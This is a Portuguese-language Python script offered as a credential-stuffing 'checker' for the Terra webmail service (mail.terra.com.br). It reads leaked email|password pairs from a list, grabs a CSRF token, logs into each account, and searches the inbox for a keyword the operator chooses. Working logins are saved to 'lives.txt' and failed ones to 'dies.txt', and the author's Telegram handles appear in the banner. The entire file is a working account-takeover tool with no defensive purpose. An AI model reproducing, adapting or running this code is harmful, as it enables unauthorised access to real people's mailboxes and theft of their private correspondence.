import requests
from colorama import Fore
import os
import time

def trazer(string,start,end):
	str = string.split(start)
	str = str[1].split(end)
	return str[0]
	pass

if not os.path.exists('resultados'):
    os.makedirs('resultados')
    
else:
    pass
  
os.system("clear")
# Banner criado pelo link: https://www.patorjk.com/software/taag/#p=display&v=2&f=ANSI%20Regular&t=%40Russo_171
print(f'''{Fore.GREEN}
      

 ██████  ██████  ██    ██ ███████ ███████  ██████           ██ ███████  ██ 
██    ██ ██   ██ ██    ██ ██      ██      ██    ██         ███      ██ ███ 
██ ██ ██ ██████  ██    ██ ███████ ███████ ██    ██          ██     ██   ██ 
██ ██ ██ ██   ██ ██    ██      ██      ██ ██    ██          ██    ██    ██ 
 █ ████  ██   ██  ██████  ███████ ███████  ██████  ███████  ██    ██    ██ 
                                                                           

''')

print(f'{Fore.YELLOW} Telegram: @cafe_com_codigo | @InfoSecGroup7\n\n')

palavra = input("\nDigite a palavra a ser consultada: ")

texto = open('lista.txt').readlines()

for x in texto:
    logins = x.strip()
    lista = logins.split('|')
    email = lista[0]
    senha = lista[1]
    
    s = requests.session()

    headers = {
        'Host': 'mail.terra.com.br',
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://mail.terra.com.br/',
        'Accept-Language': 'pt-PT,pt;q=0.9', 
    }

    r1 = requests.get('https://mail.terra.com.br/mail/index.php?r=site/csrf&format=json', headers=headers).text
    
    time.sleep(1)
    
    try:
        token = trazer(r1, 'CSRF":"', '"')
        
    except:
        time.sleep(2)
        pass
    
    headers = {
        'Host': 'mail.terra.com.br',
        'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://mail.terra.com.br',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://mail.terra.com.br/',
        'Accept-Language': 'pt-PT,pt;q=0.9',
    }
  
    data = {
        'YII_CSRF_TOKEN': token,
        'LoginForm[username]': email,
        'LoginForm[password]': senha,
    }
  
    r2 = s.post(
        'https://mail.terra.com.br/mail/index.php?r=site/login&format=json',
        
        headers=headers,
        data=data,
    ).text
    
    if 'valid":true' in r2:
    
        headers = {
            'Host': 'mail.terra.com.br',
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'Accept': '*/*',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://mail.terra.com.br/ozone/',
            'Accept-Language': 'pt-PT,pt;q=0.9',
        }
        
        r3 = s.get(
            f'https://mail.terra.com.br/ws/index.php?r=message/wslist&format=json&MailBox%5Bmailbox_id%5D=INBOX&MessageAsQuery%5Benvelope%5D%5Bfrom%5D={palavra}&MessageAsQuery%5Benvelope%5D%5Bto%5D={palavra}&MessageAsQuery%5Benvelope%5D%5Bsubject%5D={palavra}&orderedByRequest=1&sort_field=_ARRIVAL_&sort_orientation=_ASC_',
            
            headers=headers,
        ).text
         
        if palavra in r3:
            print(f'{Fore.GREEN}\n[+] Aprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
            f = open("resultados/lives.txt", "a")
            f.write(f"\n[+] Aprovado => {email}|{senha} => Palavra: {palavra}\nChecker criado por: @Russo_171")
            f.close()
            
        else:
            print(f'{Fore.YELLOW}\n[-] Email/Senha corretos, porém a palavra não foi encontrada => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
            f = open("resultados/palavra_nao_encontrada.txt", "a")
            f.write(f"\n[-] Email/Senha corretos, porém a palavra não foi encontrada => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171")
            f.close()
        
    else:
        print(f'{Fore.RED}\n[-] Reprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171')
        f = open("resultados/dies.txt", "a")
        f.write(f"\n[-] Reprovado => {email}|{senha} => Palavra: {palavra}\n Checker criado por: @Russo_171")
        f.close()


